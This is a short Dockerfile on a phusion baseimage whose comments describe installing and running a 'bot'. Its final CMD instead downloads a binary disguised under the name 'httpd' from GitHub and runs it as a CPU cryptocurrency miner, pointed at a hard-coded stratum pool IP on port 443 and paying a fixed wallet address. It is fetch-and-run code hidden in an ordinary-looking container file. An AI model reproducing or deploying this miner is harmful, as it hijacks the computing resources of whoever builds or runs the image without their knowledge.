FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Copy files:
COPY startbot.sh /home
COPY /stuff /home/stuff

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a cpupower -o stratum+tcp://149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 100-999 -n 1)-EXCEL) -p c=CPU -t2

